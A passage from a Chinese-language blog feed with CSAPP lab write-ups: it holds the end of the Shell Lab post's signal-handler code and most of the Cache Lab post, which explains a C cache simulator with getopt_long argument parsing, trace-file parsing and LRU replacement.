job<span class="token operator">-></span>state <span class="token operator">!=</span> FG<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sigchld_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    <span class="token keyword">int</span> status<span class="token punctuation">;</span>    <span class="token class-name">sigset_t</span> mask_all<span class="token punctuation">,</span> prev_one<span class="token punctuation">;</span>        <span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> WNOHANG <span class="token operator">|</span> WUNTRACED<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSTOPPED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) stopped by signal 20\n"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span> <span class="token operator">-></span> state <span class="token operator">=</span> ST<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSIGNALED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) terminated by signal 2\n"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sigint_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> pid <span class="token operator">=</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>pid<span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="sigtstp-handler"><a href="#sigtstp-handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sigtstp_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> pid <span class="token operator">=</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>pid<span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本 Lab 需要实现一个简易的 shell，主要考察对进程和信号的理解，以及对与其相关的 POSIX API 的使用，对应知识点为书中的第 8 章内容。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Cache Lab</title>
    <link href="http://lordaeronesz.github.io/2024/12/17/CSAPP-Cache-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/12/17/CSAPP-Cache-Lab/</id>
    <published>2024-12-17T03:45:11.000Z</published>
    <updated>2024-12-21T05:57:01.061Z</updated>
    
    <content type="html"><![CDATA[<p>本 Lab 主要考察对计算机高速缓存（Cache）机制的理解，以及如何针对 Cache 进行程序的优化，对应知识点为书中的 6.4 ~ 6.6 节内容。</p><span id="more"></span><h1 id="Part-A-Writing-a-Cache-Simulator"><a href="#Part-A-Writing-a-Cache-Simulator" class="headerlink" title="Part A: Writing a Cache Simulator"></a>Part A: Writing a Cache Simulator</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>Part A 需要实现一个 Cache 模拟器，能够根据 valgrind 工具所生成的访存跟踪数据，模拟在特定参数的 Cache 环境下的命中（hits）次数、不命中（misses）次数和置换（evictions）次数，目标是实现与 csim-ref 同等的功能。模拟器需要具备的几个功能模块如下：</p><ul><li><p>对命令行参数进行参数解析。</p></li><li><p>读取 trace 文件并解析为地址访问流。</p></li><li><p>定义 Cache 模拟器数据结构，以及相关的函数操作，包括初始化和地址访问。</p></li><li><p>遍历解析出来的地址访问流，依次进行访问模拟，计算得到命中次数等信息。</p></li></ul><p>接下来分别对它们进行介绍。</p><h3 id="命令行参数解析"><a href="#命令行参数解析" class="headerlink" title="命令行参数解析"></a>命令行参数解析</h3><p>根据实验手册的提示，可以使用 <code>getopt</code> 函数进行命令行参数的解析。另外，如果需要支持长选项（形如 <code>--opt arg</code>），则可以使用 GNU C 库提供的扩展版本 <code>getopt_long</code> 函数，其使用方法如下：</p><blockquote><ul><li><strong>generated by GPT4o</strong></li></ul><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><pre class="language-c" data-language="c"><code class="language-c">include <span class="token operator">&lt;</span>getopt<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token keyword">int</span> <span class="token function">getopt_long</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>optstring<span class="token punctuation">,</span>                <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">option</span> <span class="token operator">*</span>longopts<span class="token punctuation">,</span>                <span class="token keyword">int</span> <span class="token operator">*</span>longindex<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><h4 id="1-argc-和-argv"><a href="#1-argc-和-argv" class="headerlink" title="1. argc 和 argv"></a>1. <code>argc</code> 和 <code>argv</code></h4><p>与标准 <code>getopt</code> 相同，分别表示命令行参数的个数和数组。</p><h4 id="2-optstring"><a href="#2-optstring" class="headerlink" title="2. optstring"></a>2. <code>optstring</code></h4><p>一个字符串，表示短选项的格式规则：</p><ul><li>每个选项是一个字符。</li><li>如果选项需要参数，在字符后添加一个冒号（<code>:</code>）。</li><li>如果选项的参数是可选的，在字符后添加两个冒号（<code>::</code>）。</li></ul><h4 id="3-longopts"><a href="#3-longopts" class="headerlink" title="3. longopts"></a>3. <code>longopts</code></h4><p>一个指向 <code>struct option</code> 数组的指针，用于定义长选项。</p><p><code>struct option</code> 定义如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">option</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span> <span class="token comment">// 长选项的名称</span>    <span class="token keyword">int</span> has_arg<span class="token punctuation">;</span>      <span class="token comment">// 选项是否需要参数（no_argument, required_argument, optional_argument）</span>    <span class="token keyword">int</span> <span class="token operator">*</span>flag<span class="token punctuation">;</span>        <span class="token comment">// 如果为 NULL，则返回值为 val；否则将 *flag 设置为 val 并返回 0</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>          <span class="token comment">// 短选项的字符值或自定义值</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><ul><li><code>name</code>：长选项名称，例如 <code>&quot;help&quot;</code> 对应 <code>--help</code>。</li><li><code>has_arg</code>：<ul><li><code>no_argument</code>（0）：无参数。</li><li><code>required_argument</code>（1）：需要参数。</li><li><code>optional_argument</code>（2）：参数可选。</li></ul></li><li><code>flag</code>：<ul><li>如果为 <code>NULL</code>，<code>getopt_long</code> 会返回 <code>val</code> 的值。</li><li>如果非 <code>NULL</code>，<code>getopt_long</code> 会将 <code>*flag</code> 设置为 <code>val</code>，并返回 0。</li></ul></li><li><code>val</code>：指定与该长选项关联的返回值（通常与短选项的字符值一致）。</li></ul><h4 id="4-longindex"><a href="#4-longindex" class="headerlink" title="4. longindex"></a>4. <code>longindex</code></h4><p>指向一个整型变量的指针，用于存储被解析的长选项在 <code>longopts</code> 数组中的索引位置。如果不需要，可以传 <code>NULL</code>。</p><hr><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><ul><li>返回短选项的字符值，或者由 <code>struct option</code> 中 <code>val</code> 指定的值。</li><li>遇到未知选项时返回 <code>?</code>。</li><li>当没有更多选项时，返回 <code>-1</code>。</li></ul></blockquote><p>根据 <code>getopt_long</code> 的返回值，以及全局变量 <code>optarg</code>，可以对不同的命令行参数进行分发处理。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// 参数定义</span><span class="token keyword">struct</span> <span class="token class-name">option</span> long_options<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#123;</span> <span class="token string">"help"</span><span class="token punctuation">,</span> no_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token string">"verbose"</span><span class="token punctuation">,</span> no_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'v'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token string">"set"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'s'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token string">"lines"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'E'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token string">"block"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token string">"trace"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'t'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 参数解析</span><span class="token keyword">int</span> opt<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>opt <span class="token operator">=</span> <span class="token function">getopt_long</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token string">"hvs:E:b:t:"</span><span class="token punctuation">,</span> long_options<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>opt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string">'h'</span><span class="token operator">:</span>            <span class="token function">print_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'v'</span><span class="token operator">:</span>            vflag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token operator">:</span>            s <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'E'</span><span class="token operator">:</span>            E <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'b'</span><span class="token operator">:</span>            b <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'t'</span><span class="token operator">:</span>            trace_file <span class="token operator">=</span> optarg<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token operator">:</span>            <span class="token function">print_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="trace-文件解析"><a href="#trace-文件解析" class="headerlink" title="trace 文件解析"></a>trace 文件解析</h3><p>对 trace 文件进行解析，首先读取文件中的每一行操作，对于 operation 为 I 的访存操作，直接跳过不做处理。由于剩余的 M, L, S 操作都满足格式 <code>[space]operation address,size</code>，因此可以直接使用 <code>sscanf</code> 进行解析，提取出各字段。</p><p>对不同操作的处理比较简单：L 和 S 操作需要一次访存，M 操作需要两次访存。</p><blockquote><p>这里我没有考虑一次访存位于多个 Cache 行中的情况，始终视作一次/两次访存，也通过了全部测试样例。</p></blockquote><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token operator">||</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    line<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>  <span class="token comment">// 去除尾置换行符</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pline <span class="token operator">=</span> line <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>         <span class="token comment">// 去除前导空格</span>    <span class="token keyword">char</span> operation<span class="token punctuation">;</span>    <span class="token keyword">int</span> address<span class="token punctuation">,</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sscanf</span><span class="token punctuation">(</span>pline<span class="token punctuation">,</span> <span class="token string">" %c %x,%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>operation<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Invalid line format: %s\n"</span><span class="token punctuation">,</span> pline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">access_cache</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>operation <span class="token operator">==</span> <span class="token string">'M'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">access_cache</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="Cache-模拟器数据结构设计"><a href="#Cache-模拟器数据结构设计" class="headerlink" title="Cache 模拟器数据结构设计"></a>Cache 模拟器数据结构设计</h3><p>整个 Cache 模拟器包含 Cache 数据部分、Cache 的参数和命中次数等模拟结果。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> E<span class="token punctuation">;</span>    <span class="token keyword">int</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> set_num<span class="token punctuation">;</span>    CacheSet <span class="token operator">*</span>sets<span class="token punctuation">;</span>    <span class="token keyword">int</span> hit_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> miss_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> evict_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> access_count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> Cache<span class="token punctuation">;</span></code></pre><p>s, E, b 参数即命令行输入的参数。Cache 数据部分可以划分为若干个 Cache 组，组的数量 set_num 等于 $2^s$。</p><p>每个 Cache 组可划分为 E 个 Cache 行。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    CacheLine <span class="token operator">*</span>lines<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CacheSet<span class="token punctuation">;</span></code></pre><p>而每个 Cache 行包含有效位、tag 和访问位。由于我们只需要统计命中次数等信息，因此在进行访存模拟时，无需实际存储任何数据内容，只需要将有效位置为 1，并更新 tag 和访问位（用于行替换策略）。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> valid<span class="token punctuation">;</span>    <span class="token keyword">int</span> tag<span class="token punctuation">;</span>    <span class="token keyword">int</span> last_used<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CacheLine<span class="token punctuation">;</span></code></pre><h3 id="地址访问"><a href="#地址访问" class="headerlink" title="地址访问"></a>地址访问</h3><p>根据地址进行模拟访存时，首先需要根据地址 address 获取 Cache 数据中对应的组号 index 和 tag。</p><p><img src="/2024/12/17/CSAPP-Cache-Lab/addr.png" alt></p><p>组号即地址 address 的第 $b$ 到 $b + s$ 位，tag 即地址 address 的高位部分。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">get_cache_parts</span><span class="token punctuation">(</span>Cache <span class="token operator">*</span>cache<span class="token punctuation">,</span> <span class="token keyword">int</span> address<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>tag<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">*</span>index <span class="token operator">=</span> <span class="token punctuation">(</span>address <span class="token operator">>></span> cache<span class="token operator">-></span>b<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>cache<span class="token operator">-></span>set_num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>tag <span class="token operator">=</span> address <span class="token operator">>></span> <span class="token punctuation">(</span>cache<span class="token operator">-></span>s <span class="token operator">+</span> cache<span class="token operator">-></span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>得到组号和 tag 后，遍历对应 Cache 组的所有行，进行 tag 的对比。若存在某一行的 tag 与 address 对应的 tag 相同，说明缓存命中，更新 <code>hit_count</code> 次数；否则，缓存不命中，更新 <code>miss_count</code> 次数，并将不命中的内存块写入 Cache 中。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> isHit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 是否命中</span>CacheSet <span class="token operator">*</span>set <span class="token operator">=</span> <span class="token operator">&amp;</span>cache<span class="token operator">-></span>sets<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cache<span class="token operator">-></span>E<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">==</span> tag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        isHit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">++</span>cache<span class="token operator">-></span>hit_count<span class="token punctuation">;</span>        set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">=</span> cache<span class="token operator">-></span>access_count<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这里可能涉及到 Cache 组已满的情况，为此需要进行替换，替换策略采用 LRU 策略，即选取最近最久未被访问过的 Cache 行。为此需要维护访问位，这里为了实现的方便，访问“位” <code>last_used</code> 使用一个整数来存储，其值表示本 Cache 行最近一次访问是整个 Cache 的第 <code>last_used</code> 次访问。因此，<code>last_used</code> 值越小，表示本行最近最久未被访问。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isHit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 未命中</span>    <span class="token operator">++</span>cache<span class="token operator">-></span>miss_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> lru_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cache<span class="token operator">-></span>E<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// LRU策略选择写入行</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">&lt;</span> set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            lru_index <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token operator">++</span>cache<span class="token operator">-></span>evict_count<span class="token punctuation">;</span>  <span class="token comment">// 行置换</span>    <span class="token punctuation">&#125;</span>    set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span>    set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">=</span> cache<span class="token operator">-></span>access_count<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"cachelab.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;getopt.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> vflag<span class="token punctuation">;</span>  <span class="token comment">// verbose flag</span><span class="token comment">// 根据vflag选择是否打印信息</span><span class="token keyword">void</span> <span class="token function">trace_info</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> info<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>vflag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token 